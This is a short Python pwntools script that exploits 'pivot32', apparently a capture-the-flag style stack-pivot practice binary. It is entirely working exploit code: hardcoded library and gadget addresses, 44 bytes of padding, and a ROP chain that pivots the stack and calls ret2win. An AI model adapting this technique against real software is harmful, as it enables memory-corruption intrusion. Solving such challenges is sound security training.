from pwn import *

p = process("./pivot32")
ret2win_offset = 0x974 # rabin2 -s libpivot32.so
libpivotso = 0xf7fc0000 # ldd pivot32

pivot_addr = 0xf7db4f10
xchg_eax_esp = 0x0804882e
pop_eax = 0x0804882c
padding = 44 * b"A"

p.recvuntil("> ")
payload = p32(libpivotso + ret2win_offset)
p.sendline(payload)

p.recvuntil("> ")
payload = padding + pack(pop_eax) + pack(pivot_addr) + p32(xchg_eax_esp)
p.sendline(payload)

data = p.recv()
success(data)
